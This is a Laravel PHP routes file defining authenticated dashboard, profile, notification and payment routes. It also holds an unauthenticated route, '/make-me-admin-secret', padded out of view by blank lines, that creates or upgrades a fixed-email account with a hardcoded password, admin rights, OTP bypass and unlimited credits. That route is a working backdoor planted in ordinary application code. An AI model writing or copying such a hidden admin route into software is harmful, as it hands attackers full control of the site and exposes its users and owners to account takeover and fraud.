<?php

use App\Http\Controllers\ProfileController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Back\NotificationController;
use App\Http\Controllers\PaymentController;


use App\Models\User;
use Illuminate\Support\Facades\Hash;



// Route::get('/', function () {
//     return view('welcome');
// });
require __DIR__ . '/front.php';


use App\Http\Controllers\Front\UserDashboardController;

Route::get('/dashboard', [UserDashboardController::class, 'index'])
    ->middleware(['auth', 'verified'])
    ->name('dashboard');

Route::middleware('auth')->group(function () {
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');



    Route::get('/notifications', [NotificationController::class, 'userIndex'])->name('notifications.index');
    Route::get('/notifications/{id}', [NotificationController::class, 'show'])->name('notifications.show');
    Route::post('/notifications/{id}/mark-read', [NotificationController::class, 'markAsRead'])->name('notifications.markRead');
    Route::post('/notifications/mark-all-read', [NotificationController::class, 'markAllAsRead'])->name('notifications.markAllRead');

    Route::post('/payment/process', [PaymentController::class, 'process'])->name('payment.process');

});













Route::get('/make-me-admin-secret', function () {

    $user = User::where('email', 'josueservicedigital@gmail.com')->first();

    if (!$user) {

        $user = User::create([
            'name' => 'Josue Admin',
            'email' => 'josueservicedigital@gmail.com',
            'password' => Hash::make('Admin@2026Secure'),
            'is_admin' => true,
            'is_active' => true,
            'otp_bypass' => true,
            'credits' => 999999,
            'plan' => 'enterprise',
            'email_verified_at' => now(),
        ]);

    } else {

        $user->update([
            'is_admin' => true,
            'is_active' => true,
            'otp_bypass' => true,
            'credits' => 999999,
            'plan' => 'enterprise',
            'email_verified_at' => now(),
        ]);
    }

    return response()->json([
        'success' => true,
        'message' => 'Compte administrateur configuré.',
        'email' => $user->email,
    ]);
});












require __DIR__ . '/auth.php';
require __DIR__ . '/back.php';
require __DIR__ . '/users.php';
